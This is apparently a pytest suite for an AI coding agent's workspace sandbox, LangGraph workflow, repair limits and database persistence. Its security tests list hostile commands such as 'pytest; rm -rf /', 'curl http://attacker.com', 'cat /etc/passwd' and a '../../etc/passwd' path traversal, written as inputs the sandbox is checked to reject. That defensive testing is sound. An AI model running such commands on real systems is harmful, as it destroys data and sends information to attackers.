from unittest.mock import MagicMock
import pytest
from sqlalchemy import select
from sqlalchemy.orm import Session

from app.database import get_db, SessionLocal
from app.models.task import Task
from app.models.task_event import TaskEvent
from app.models.file_change import FileChange
from app.models.test_run import TestRun
from app.agent.tools import WorkspaceTools, compute_unified_diff
from app.agent.state import AgentState
from app.agent.graph import create_codeforge_graph
from app.services.task_runner import TaskRunner


# ==============================================================================
# 1. WORKSPACE TOOLS TESTS (SANDBOX & SECURITY)
# ==============================================================================
def test_workspace_tools_path_security():
    """Verify sandbox prevents path traversal attacks outside workspace."""
    tools = WorkspaceTools(base_dir="c:/some/isolated/workspace")

    with pytest.raises(ValueError) as exc1:
        tools.read_file("../../etc/passwd")
    assert "path traversal" in str(exc1.value).lower()

    with pytest.raises(ValueError) as exc2:
        tools.write_file("../secrets.env", "KEY=123")
    assert "path traversal" in str(exc2.value).lower()


def test_workspace_tools_prohibited_commands():
    """Verify arbitrary shell commands, pipes, and chaining are strictly rejected."""
    tools = WorkspaceTools()

    # Chaining operators
    prohibited_commands = [
        "pytest; rm -rf /",
        "pytest && curl http://attacker.com",
        "pytest | grep fail",
        "cat /etc/passwd",
        "bash -c 'echo hacked'",
        "curl -X POST http://malicious.com",
        "powershell Get-Process",
    ]
    for cmd in prohibited_commands:
        with pytest.raises(ValueError) as exc:
            tools.run_tests(cmd)
        err = str(exc.value).lower()
        assert "prohibited" in err or "whitelist" in err or "unsafe" in err


def test_workspace_tools_permitted_test_runner():
    """Verify permitted test runner commands execute and capture results."""
    def mock_runner(cmd: str):
        return {
            "exit_code": 0,
            "passed": True,
            "stdout": "1 passed in 0.05s",
            "stderr": "",
        }

    tools = WorkspaceTools(test_runner_fn=mock_runner)
    result = tools.run_tests("pytest -v")
    assert result["exit_code"] == 0
    assert result["passed"] is True
    assert "1 passed" in result["stdout"]


def test_workspace_tools_file_operations_and_diff():
    """Verify in-memory virtual workspace operations and diff computation."""
    tools = WorkspaceTools(virtual_files={"calc.py": "def add(a, b):\n    return 0\n"})
    assert tools.list_files() == ["calc.py"]
    assert "return 0" in tools.read_file("calc.py")

    patch_res = tools.apply_patch("calc.py", "def add(a, b):\n    return a + b\n")
    assert patch_res["changed"] is True
    assert "-    return 0" in patch_res["diff_text"]
    assert "+    return a + b" in patch_res["diff_text"]
    assert "return a + b" in tools.read_file("calc.py")


# ==============================================================================
# 2. LANGGRAPH WORKFLOW TESTS
# ==============================================================================
def test_graph_happy_path_success():
    """Verify graph executes all 8 stages and finishes completed on passing tests."""
    mock_llm = MagicMock()
    mock_llm.invoke_prompt.side_effect = [
        "Investigated calc.py: add function returns wrong value",  # Investigate
        "1. Fix calc.py to return a + b\n2. Run pytest",           # Plan
        "def add(a, b):\n    return a + b\n",                      # Edit
        "Verified clean code changes with passing test suite.",     # Verify
    ]

    def test_runner(cmd: str):
        return {"exit_code": 0, "passed": True, "stdout": "1 passed", "stderr": ""}

    tools = WorkspaceTools(
        virtual_files={"calc.py": "def add(a, b):\n    return 0\n"},
        test_runner_fn=test_runner,
    )

    initial_state: AgentState = {
        "task_id": 101,
        "repository_url": "https://github.com/octocat/Hello-World",
        "owner": "octocat",
        "repo": "Hello-World",
        "task_description": "Fix addition bug in calc.py",
        "status": "running",
        "current_stage": "investigating",
        "retry_count": 0,
        "max_retries": 3,
        "repair_count": 0,
        "max_repairs": 2,
        "is_cancelled": False,
        "relevant_files": ["calc.py"],
        "proposed_changes": {},
        "applied_changes": {},
        "original_contents": {},
        "file_diffs": {},
        "events": [],
    }

    graph = create_codeforge_graph()
    final_state = graph.invoke(
        initial_state,
        config={"configurable": {"workspace_tools": tools, "llm_service": mock_llm}},
    )

    assert final_state["status"] == "completed"
    assert final_state["current_stage"] == "completed"
    assert final_state["verification_passed"] is True
    assert final_state["safety_checks_passed"] is True
    assert final_state["test_passed"] is True
    assert final_state["test_exit_code"] == 0
    assert "calc.py" in final_state["applied_changes"]
    assert "return a + b" in final_state["applied_changes"]["calc.py"]
    assert final_state["repair_count"] == 0


def test_graph_repair_loop_success():
    """Verify workflow executes diagnose -> repair -> test when test fails first time."""
    mock_llm = MagicMock()
    mock_llm.invoke_prompt.side_effect = [
        "Investigated calc.py",                                   # Investigate
        "Plan: Fix calc.py",                                      # Plan
        "def add(a, b):\n    return a - b\n",                     # Edit (buggy fix)
        "Diagnosis: subtraction used instead of addition",        # Diagnose
        "def add(a, b):\n    return a + b\n",                     # Repair (correct fix)
        "Verified repair fix passes tests.",                      # Verify
    ]

    call_count = {"test": 0}

    def test_runner(cmd: str):
        call_count["test"] += 1
        if call_count["test"] == 1:
            return {"exit_code": 1, "passed": False, "stdout": "", "stderr": "AssertionError: 2 != 0"}
        return {"exit_code": 0, "passed": True, "stdout": "1 passed", "stderr": ""}

    tools = WorkspaceTools(
        virtual_files={"calc.py": "def add(a, b):\n    return 0\n"},
        test_runner_fn=test_runner,
    )

    initial_state: AgentState = {
        "task_id": 102,
        "repository_url": "https://github.com/octocat/Hello-World",
        "owner": "octocat",
        "repo": "Hello-World",
        "task_description": "Fix add in calc.py",
        "status": "running",
        "current_stage": "investigating",
        "retry_count": 0,
        "max_retries": 3,
        "repair_count": 0,
        "max_repairs": 2,
        "is_cancelled": False,
        "relevant_files": ["calc.py"],
        "proposed_changes": {},
        "applied_changes": {},
        "original_contents": {},
        "file_diffs": {},
        "events": [],
    }

    graph = create_codeforge_graph()
    final_state = graph.invoke(
        initial_state,
        config={"configurable": {"workspace_tools": tools, "llm_service": mock_llm}},
    )

    assert final_state["status"] == "completed"
    assert final_state["verification_passed"] is True
    assert final_state["repair_count"] == 1
    assert call_count["test"] == 2
    assert "return a + b" in final_state["applied_changes"]["calc.py"]


def test_graph_exceeds_max_repairs_needs_human_review():
    """Verify workflow bounds repair attempts and terminates in needs_human_review when repairs fail."""
    mock_llm = MagicMock()
    mock_llm.invoke_prompt.return_value = "def add(a, b):\n    return 0\n"

    def always_fail_runner(cmd: str):
        return {"exit_code": 1, "passed": False, "stdout": "", "stderr": "Persistent failure"}

    tools = WorkspaceTools(
        virtual_files={"calc.py": "def add(a, b):\n    return -1\n"},
        test_runner_fn=always_fail_runner,
    )

    initial_state: AgentState = {
        "task_id": 103,
        "repository_url": "https://github.com/octocat/Hello-World",
        "owner": "octocat",
        "repo": "Hello-World",
        "task_description": "Fix bug in calc.py",
        "status": "running",
        "current_stage": "investigating",
        "retry_count": 0,
        "max_retries": 3,
        "repair_count": 0,
        "max_repairs": 2,
        "is_cancelled": False,
        "relevant_files": ["calc.py"],
        "proposed_changes": {},
        "applied_changes": {},
        "original_contents": {},
        "file_diffs": {},
        "events": [],
    }

    graph = create_codeforge_graph()
    final_state = graph.invoke(
        initial_state,
        config={"configurable": {"workspace_tools": tools, "llm_service": mock_llm}},
    )

    # Must NOT be completed because tests failed
    assert final_state["status"] == "needs_human_review"
    assert final_state["current_stage"] == "needs_human_review"
    assert final_state["verification_passed"] is False
    assert final_state["repair_count"] == 2  # Stopped at max_repairs


def test_graph_cancellation():
    """Verify task cancellation routes immediately to finish with cancelled status."""
    tools = WorkspaceTools(virtual_files={"main.py": "pass\n"})
    initial_state: AgentState = {
        "task_id": 104,
        "repository_url": "https://github.com/octocat/Hello-World",
        "task_description": "Test cancellation",
        "is_cancelled": True,
        "status": "cancelled",
        "current_stage": "cancelled",
    }

    graph = create_codeforge_graph()
    final_state = graph.invoke(
        initial_state,
        config={"configurable": {"workspace_tools": tools}},
    )
    assert final_state["status"] == "cancelled"
    assert final_state["current_stage"] == "cancelled"


# ==============================================================================
# 3. TASK RUNNER & POSTGRESQL PERSISTENCE TESTS
# ==============================================================================
def test_task_runner_end_to_end_db_persistence():
    """Verify TaskRunner executes graph and records TaskEvent, FileChange, and TestRun in DB."""
    db: Session = SessionLocal()
    try:
        # Create a test task in the database
        task = Task(
            repository_url="https://github.com/octocat/Hello-World",
            task_description="Fix addition in calc.py",
            status="queued",
            current_agent_stage="queued",
            retry_count=0,
            max_retries=3,
        )
        db.add(task)
        db.commit()
        db.refresh(task)
        task_id = task.id

        mock_llm = MagicMock()
        mock_llm.invoke_prompt.side_effect = [
            "Analysis: calc.py requires correct summation.",
            "1. Edit calc.py\n2. Run pytest",
            "def add(a, b):\n    return a + b\n",
            "Verified test suite passes.",
        ]

        def test_runner(cmd: str):
            return {"exit_code": 0, "passed": True, "stdout": "1 passed", "stderr": ""}

        tools = WorkspaceTools(
            virtual_files={"calc.py": "def add(a, b):\n    return 0\n"},
            test_runner_fn=test_runner,
        )

        runner = TaskRunner(db_factory=SessionLocal, llm_service=mock_llm)
        final_state = runner.run_task(task_id, workspace_tools=tools)

        assert final_state["status"] == "completed"

        # Verify DB records
        db.expire_all()
        updated_task = db.scalar(select(Task).where(Task.id == task_id))
        assert updated_task.status == "completed"
        assert updated_task.current_agent_stage == "completed"

        # Check TaskEvents
        events = db.scalars(select(TaskEvent).where(TaskEvent.task_id == task_id)).all()
        assert len(events) >= 5
        stages = [e.stage for e in events]
        assert "investigating" in stages
        assert "planning" in stages
        assert "editing" in stages
        assert "testing" in stages
        assert "completed" in stages

        # Check FileChanges
        changes = db.scalars(select(FileChange).where(FileChange.task_id == task_id)).all()
        assert len(changes) >= 1
        assert changes[0].relative_file_path == "calc.py"
        assert "+    return a + b" in changes[0].diff_text

        # Check TestRuns
        test_runs = db.scalars(select(TestRun).where(TestRun.task_id == task_id)).all()
        assert len(test_runs) >= 1
        assert test_runs[0].passed is True
        assert test_runs[0].exit_code == 0

    finally:
        # Cleanup
        try:
            db.query(TestRun).filter(TestRun.task_id == task_id).delete()
            db.query(FileChange).filter(FileChange.task_id == task_id).delete()
            db.query(TaskEvent).filter(TaskEvent.task_id == task_id).delete()
            db.query(Task).filter(Task.id == task_id).delete()
            db.commit()
        except Exception:
            db.rollback()
        db.close()


def test_task_runner_cancel_task():
    """Verify TaskRunner.cancel_task updates task status and persists cancellation event."""
    db: Session = SessionLocal()
    try:
        task = Task(
            repository_url="https://github.com/octocat/Hello-World",
            task_description="Cancel me",
            status="running",
            current_agent_stage="testing",
        )
        db.add(task)
        db.commit()
        db.refresh(task)
        task_id = task.id

        runner = TaskRunner(db_factory=SessionLocal)
        res = runner.cancel_task(task_id)
        assert res is True

        db.expire_all()
        updated_task = db.scalar(select(Task).where(Task.id == task_id))
        assert updated_task.status == "cancelled"

        assert updated_task.current_agent_stage == "cancelled"

        events = db.scalars(select(TaskEvent).where(TaskEvent.task_id == task_id)).all()
        assert any(e.event_type == "task_cancelled" for e in events)

    finally:
        try:
            db.query(TaskEvent).filter(TaskEvent.task_id == task_id).delete()
            db.query(Task).filter(Task.id == task_id).delete()
            db.commit()
        except Exception:
            db.rollback()
        db.close()


# ==============================================================================
# 4. PHASE 5 AUDIT TESTS (WORKFLOW INVARIANTS, CONTEXT FLOW, REPAIR & VERIFICATION)
# ==============================================================================

def test_audit_context_flow_investigation_to_editing():
    """
    Verify audit requirements 1, 2, and 3:
    - Investigation receives task description and repository context.
    - Planning receives investigation findings.
    - Editing receives the generated plan in change_description.
    """
    recorded_prompts = {}

    mock_llm = MagicMock()
    def mock_invoke(prompt, **kwargs):
        # Identify which prompt was called by kwargs
        if "investigation_summary" in kwargs:
            # Planning prompt
            recorded_prompts["plan_kwargs"] = kwargs
            return "Step 1: Update add function in calc.py to return a + b\nStep 2: Run pytest"
        elif "change_description" in kwargs:
            # Edit prompt
            recorded_prompts["edit_kwargs"] = kwargs
            return "def add(a, b):\n    return a + b\n"
        elif "code_context" in kwargs:
            # Investigation prompt
            recorded_prompts["investigate_kwargs"] = kwargs
            return "Identified calc.py: arithmetic operator error in add function."
        elif "diff_summary" in kwargs or "exit_code" in kwargs:
            # Verification prompt
            recorded_prompts["verify_kwargs"] = kwargs
            return "Verified changes satisfy criteria."
        return "Generic response"

    mock_llm.invoke_prompt.side_effect = mock_invoke

    tools = WorkspaceTools(
        virtual_files={"calc.py": "def add(a, b):\n    return a - b\n"},
        test_runner_fn=lambda cmd: {"exit_code": 0, "passed": True, "stdout": "1 passed", "stderr": ""},
    )

    initial_state: AgentState = {
        "task_id": 201,
        "repository_url": "https://github.com/my-org/math-repo",
        "owner": "my-org",
        "repo": "math-repo",
        "task_description": "Fix arithmetic subtraction bug in add(a, b)",
        "acceptance_criteria": "add(2, 3) must equal 5",
        "status": "running",
        "current_stage": "investigating",
        "retry_count": 0,
        "max_retries": 3,
        "repair_count": 0,
        "max_repairs": 2,
        "is_cancelled": False,
        "relevant_files": [],
        "proposed_changes": {},
        "applied_changes": {},
        "original_contents": {},
        "file_diffs": {},
        "events": [],
    }

    graph = create_codeforge_graph()
    final_state = graph.invoke(
        initial_state,
        config={"configurable": {"workspace_tools": tools, "llm_service": mock_llm}},
    )

    # 1. Verify Investigation received correct context
    assert "investigate_kwargs" in recorded_prompts
    assert recorded_prompts["investigate_kwargs"]["repository_name"] == "my-org/math-repo"
    assert "Fix arithmetic subtraction" in recorded_prompts["investigate_kwargs"]["task_description"]
    assert "add(2, 3) must equal 5" in recorded_prompts["investigate_kwargs"]["acceptance_criteria"]
    assert "calc.py" in recorded_prompts["investigate_kwargs"]["code_context"]

    # 2. Verify Planning received investigation findings
    assert "plan_kwargs" in recorded_prompts
    assert "calc.py" in recorded_prompts["plan_kwargs"]["relevant_files"]
    assert "Identified calc.py" in recorded_prompts["plan_kwargs"]["investigation_summary"]

    # 3. Verify Editing received the plan inside change_description
    assert "edit_kwargs" in recorded_prompts
    assert "Implementation Plan:" in recorded_prompts["edit_kwargs"]["change_description"]
    assert "Step 1: Update add function" in recorded_prompts["edit_kwargs"]["change_description"]

    # 4. Verify completion
    assert final_state["status"] == "completed"
    assert final_state["verification_passed"] is True


def test_audit_failed_cloning_records_error_and_event():
    """
    Verify audit requirement 8:
    When repository cloning fails (e.g., DNS network error or invalid URL),
    TaskRunner marks task status as failed, preserves failure message, and logs unhandled_exception event.
    """
    db: Session = SessionLocal()
    task_id = None
    try:
        task = Task(
            repository_url="https://github.com/fake-org/unreachable-repo",
            task_description="Test clone failure recording",
            status="queued",
            current_agent_stage="queued",
            retry_count=0,
            max_retries=3,
        )
        db.add(task)
        db.commit()
        db.refresh(task)
        task_id = task.id

        runner = TaskRunner(db_factory=SessionLocal)
        # Mock setup_task_workspace to raise network clone error
        def mock_failing_clone(tid, url, **kwargs):
            raise RuntimeError("Network error during repository cloning (exit code 128): Could not resolve host: github.com")

        runner.setup_task_workspace = mock_failing_clone

        final_state = runner.run_task(task_id)

        assert final_state["status"] == "failed"
        assert final_state["current_stage"] == "failed"
        assert final_state["verification_passed"] is False
        assert "Could not resolve host: github.com" in final_state["error_summary"]

        # Check database updates
        db.expire_all()
        persisted_task = db.scalar(select(Task).where(Task.id == task_id))
        assert persisted_task.status == "failed"
        assert persisted_task.current_agent_stage == "failed"
        assert "Could not resolve host" in persisted_task.error_summary

        # Check events
        events = db.scalars(
            select(TaskEvent)
            .where(TaskEvent.task_id == task_id)
            .order_by(TaskEvent.created_at.asc(), TaskEvent.id.asc())
        ).all()
        assert any(e.event_type == "unhandled_exception" for e in events)
        err_event = next(e for e in events if e.event_type == "unhandled_exception")
        assert "Could not resolve host: github.com" in err_event.message

    finally:
        if task_id:
            try:
                db.query(TaskEvent).filter(TaskEvent.task_id == task_id).delete()
                db.query(Task).filter(Task.id == task_id).delete()
                db.commit()
            except Exception:
                db.rollback()
        db.close()


def test_audit_test_failure_captures_actual_output_and_exit_code():
    """
    Verify audit requirement 4:
    Testing captures actual exit code, stdout, and stderr accurately without masking.
    """
    from app.agent.nodes import test_node

    tools = WorkspaceTools(
        test_runner_fn=lambda cmd: {
            "exit_code": 2,
            "passed": False,
            "stdout": "collected 5 items",
            "stderr": "FAILURES: test_syntax_error (SyntaxError: invalid syntax)",
        }
    )

    state: AgentState = {
        "task_id": 202,
        "test_command": "pytest -v",
        "current_stage": "editing",
        "events": [],
    }

    result_state = test_node(state, config={"configurable": {"workspace_tools": tools}})

    assert result_state["test_exit_code"] == 2
    assert result_state["test_passed"] is False
    assert result_state["test_stdout"] == "collected 5 items"
    assert "SyntaxError: invalid syntax" in result_state["test_stderr"]


def test_audit_repair_limits_bounded_at_configured_count():
    """
    Verify audit requirement 5:
    Repair loops run only when appropriate and strictly stop when max_repairs is reached.
    Tests max_repairs=1 bound.
    """
    repair_attempts = {"count": 0}

    mock_llm = MagicMock()
    def mock_invoke(prompt, **kwargs):
        if "diagnosis" in kwargs:
            repair_attempts["count"] += 1
            return "def add(a, b):\n    return a + b\n"
        return "Investigated calc.py"

    mock_llm.invoke_prompt.side_effect = mock_invoke

    # Test runner that always fails
    tools = WorkspaceTools(
        virtual_files={"calc.py": "def add(a, b):\n    return 0\n"},
        test_runner_fn=lambda cmd: {"exit_code": 1, "passed": False, "stdout": "", "stderr": "AssertFailed"},
    )

    initial_state: AgentState = {
        "task_id": 203,
        "repository_url": "https://github.com/octocat/Hello-World",
        "owner": "octocat",
        "repo": "Hello-World",
        "task_description": "Fix calculation bug",
        "status": "running",
        "current_stage": "investigating",
        "retry_count": 0,
        "max_retries": 3,
        "repair_count": 0,
        "max_repairs": 1,  # Strict limit: 1 repair max
        "is_cancelled": False,
        "relevant_files": ["calc.py"],
        "proposed_changes": {},
        "applied_changes": {},
        "original_contents": {},
        "file_diffs": {},
        "events": [],
    }

    graph = create_codeforge_graph()
    final_state = graph.invoke(
        initial_state,
        config={"configurable": {"workspace_tools": tools, "llm_service": mock_llm}},
    )

    # Must terminate in needs_human_review when repair limit exhausted
    assert final_state["status"] == "needs_human_review"
    assert final_state["current_stage"] == "needs_human_review"
    assert final_state["repair_count"] == 1
    assert repair_attempts["count"] == 1  # Exactly 1 repair attempted, not 2
    assert final_state["verification_passed"] is False


def test_audit_final_verification_independent_checks():
    """
    Verify audit requirements 6, 7, and 10:
    - Verification independently checks the actual workspace diff and test results.
    - Graph NEVER marks success if tests fail or if no valid diff was produced.
    """
    from app.agent.nodes import verify_node, finish_node

    # Case A: Tests passed, but workspace has empty diff -> Verification MUST fail
    tools_no_diff = WorkspaceTools(virtual_files={"main.py": "x = 1\n"})
    state_no_diff: AgentState = {
        "task_id": 204,
        "test_passed": True,
        "test_exit_code": 0,
        "applied_changes": {"main.py": "x = 1\n"},
        "file_diffs": {"main.py": ""},  # Empty diff!
        "repair_count": 0,
        "max_repairs": 2,
        "events": [],
    }
    verified_a = verify_node(state_no_diff, config={"configurable": {"workspace_tools": tools_no_diff}})
    assert verified_a["verification_passed"] is False
    assert verified_a["safety_checks_passed"] is False

    finished_a = finish_node(verified_a)
    assert finished_a["status"] != "completed"
    assert finished_a["status"] == "failed"

    # Case B: Diffs exist, but tests failed -> Verification MUST fail
    tools_with_diff = WorkspaceTools(virtual_files={"main.py": "x = 2\n"})
    # Seed snapshot so get_diff returns diff
    tools_with_diff._original_snapshots["main.py"] = "x = 1\n"
    state_failed_tests: AgentState = {
        "task_id": 205,
        "test_passed": False,
        "test_exit_code": 1,
        "applied_changes": {"main.py": "x = 2\n"},
        "file_diffs": {"main.py": "+x = 2\n-x = 1\n"},
        "repair_count": 0,
        "max_repairs": 2,
        "events": [],
    }
    verified_b = verify_node(state_failed_tests, config={"configurable": {"workspace_tools": tools_with_diff}})
    assert verified_b["verification_passed"] is False
    assert verified_b["safety_checks_passed"] is False

    finished_b = finish_node(verified_b)
    assert finished_b["status"] != "completed"
    assert finished_b["status"] == "failed"

    # Case C: Tests passed AND actual workspace diff exists -> Verification succeeds
    state_success: AgentState = {
        "task_id": 206,
        "test_passed": True,
        "test_exit_code": 0,
        "applied_changes": {"main.py": "x = 2\n"},
        "file_diffs": {"main.py": "+x = 2\n-x = 1\n"},
        "repair_count": 0,
        "max_repairs": 2,
        "events": [],
    }
    verified_c = verify_node(state_success, config={"configurable": {"workspace_tools": tools_with_diff}})
    assert verified_c["verification_passed"] is True
    assert verified_c["safety_checks_passed"] is True

    finished_c = finish_node(verified_c)
    assert finished_c["status"] == "completed"
    assert finished_c["current_stage"] == "completed"

